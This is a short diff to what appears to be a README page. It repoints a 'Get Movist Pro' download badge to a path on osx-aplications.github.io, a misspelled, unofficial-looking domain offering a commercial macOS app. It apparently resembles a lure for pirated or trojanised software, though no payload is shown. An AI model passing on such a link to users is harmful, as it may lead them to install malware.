@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/">
+  <a href="https://osx-aplications.github.io/.github/movistpro">
     <img src="https://img.shields.io/badge/Get%20Movist%20Pro-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Movist Pro">
   </a>
 </p>
